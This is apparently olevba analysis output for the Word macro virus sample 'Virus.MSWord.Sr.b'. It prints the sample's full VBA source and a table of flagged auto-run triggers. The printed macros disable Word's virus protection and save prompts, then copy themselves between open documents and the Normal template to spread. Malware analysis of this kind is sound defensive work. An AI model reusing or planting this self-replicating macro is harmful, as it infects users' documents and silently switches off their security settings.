olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sr.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sr.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sr.bas 
in file: Virus.MSWord.Sr.b - OLE stream: 'Macros/VBA/Sr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub Stp()
 On Error Resume Next
  zz = Word.ActiveDocument.FullName
  ee = Normal.ThisDocument.FullName
  

  Application.OrganizerCopy Source:=ee, _
      Destination:=zz, name:="Sr", _
      Object:=3
      
  Application.OrganizerCopy Source:=zz, _
      Destination:=ee, name:="Sr", _
      Object:=3
      
    Word.NormalTemplate.Save
End Sub
Sub AutoNew()

Word.Options.VirusProtection = False
ActiveDocument.Saved = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.Caption = "T" + ""
End Sub
Sub AutoOpen()
Word.Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
ActiveDocument.Saved = False
Application.Caption = "T" + ""
Stp
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

